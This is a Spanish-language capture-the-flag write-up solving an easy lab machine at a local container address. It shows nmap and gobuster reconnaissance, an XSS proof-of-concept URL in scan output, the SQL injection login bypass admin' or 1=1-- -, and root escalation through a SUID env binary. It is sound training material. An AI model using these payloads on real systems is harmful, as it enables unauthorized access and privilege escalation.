tags: #muy-facil #sqli #suid 
_______________________________
Comenzamos como siempre haciendo un escaneo de puertos, usando el siguiente comando de nmap:
```bash
nmap -sS -p- 172.17.0.2 -oN ports  -vvv -oN ports
```

![[Anexos/Pasted image 20251007165534.png]]

Ahora, ejecutamos el siguiente comando para escanear las versiones y enviar unos scripts básicos de reconocimiento:
```bash
nmap -sCV -p80,22 172.17.0.2 -oN versions
```

![[Anexos/Pasted image 20251007172120.png]]

Ahora ejecutamos el comando:
```bash
nmap --script vuln 172.17.0.2 -oN vuln
```

>http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  11   │ | http-cookie-flags: 
  12   │ |   /: 
  13   │ |     PHPSESSID: 
  14   │ |_      httponly flag not set
  15   │ | http-phpself-xss: 
  16   │ |   VULNERABLE:
  17   │ |   Unsafe use of $_SERVER["PHP_SELF"] in PHP files
  18   │ |     State: VULNERABLE (Exploitable)
  19   │ |       PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
  20   │ |              
  21   │ |     Extra information:
  22   │ |       
  23   │ |   Vulnerable files with proof of concept:
  24   │ |     http://172.17.0.2/index.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
  25   │ |   Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.17.0.2
  26   │ |     References:
  27   │ |       http://php.net/manual/en/reserved.variables.server.php
  28   │ |_      https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
  29   │ | http-csrf: 
  30   │ | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=172.17.0.2
  31   │ |   Found the following possible CSRF vulnerabilities: 
  32   │ |     
  33   │ |     Path: http://172.17.0.2:80/
  34   │ |     Form id: name
  35   │ |     Form action: /index.php
  36   │ |     
  37   │ |     Path: http://172.17.0.2:80/index.php
  38   │ |     Form id: name
  39   │ |_    Form action: /index.php
  40   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  41   │ 
  42   │ # Nmap done at Tue Oct  7 17:22:53 2025 -- 1 IP address (1 host up) scanned in 44.27 seconds
_________________________________________

Ahora, vamos a realizar fuzzing con gobuster, usando el siguiente comando:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 5 -x .php,.txt,.xml,.html -o dirs.txt
```

![[Anexos/Pasted image 20251007172607.png]]

Al acceder a http://172.17.0.2/index.php observamos un panel de login:

![[Anexos/Pasted image 20251007172738.png]]

Paralelamente, si accedemos a http://172.17.0.2/config.php vemos que la pagina se queda en blanco y no ocurre nada.

Si probamos hacer una SQL Injection en el panel, vemos que funciona con el siguiente comando: **admin' or 1=1-- -**

Nos da acceso de administrador y nos arroja una contraseña para el usuario Dylan: 

![[Anexos/Pasted image 20251007183038.png]]

Ahora, probamos la contraseña para entrar por SSH, con el comando:

```bash
ssh dylan@172.17.0.2
```

Y, usando su contraseña, accedemos.

Ahora, con el siguiente comando, buscamos si tenemos algún binario que pueda ser abusado para escalar privilegios, y así es:

```bash
find / -perm -4000 2>/dev/null
```

![[Anexos/Pasted image 20251007183543.png]]

En este caso, buscando en https://gtfobins.github.io/gtfobins/env/ podemos ver que efectivamente es vulnerable por SUID:

![[Anexos/Pasted image 20251007183717.png]]

Así que, ejecutamos el siguiente comando **en la raíz del sistema** para obtener una bash privilegiada como root:

```bash
./env /bin/sh -p
```

Y con esto, obtenemos el root, completando la máquina!

![[Anexos/Pasted image 20251007183949.png]]
